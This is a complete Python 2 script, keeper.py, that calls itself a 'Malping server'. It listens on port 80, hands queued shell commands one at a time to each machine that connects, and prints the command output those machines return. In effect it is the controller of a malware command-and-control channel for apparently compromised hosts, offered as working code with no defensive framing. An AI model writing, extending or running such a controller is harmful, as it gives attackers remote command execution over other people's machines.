#!/usr/bin/env python

import sys
import Queue
import socket
import datetime

HOST = ''
PORT = 80
SIZE = 1024

def create_cmd_queue(cmds):
    cmd_queue = Queue.Queue()

    for cmd in cmds:
        cmd_queue.put(cmd)

    return cmd_queue

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(1)

    if not sys.argv[1:]:
        print 'Usage: sudo ./keeper.py "cmd 1" "cmd 2"'
        sys.exit(1)
    cmds = sys.argv[1:]
    cmd_queue = create_cmd_queue(cmds)

    print '[+] Malping server started on {}.'.format(PORT)
    while True:

        if cmd_queue.empty():
            print '[-] Finished with commands'
            break
        conn, addr = s.accept()
        print '[i] Connected By: {} at {}'.format(addr, datetime.datetime.now())

        cmd = cmd_queue.get()

        print '[+] Sending Command:', cmd
        conn.send(cmd)
        print '[+] Command Stdout:'
        stdout = conn.recv(SIZE)
        print stdout
        conn.close()

if __name__ == '__main__':
    main()
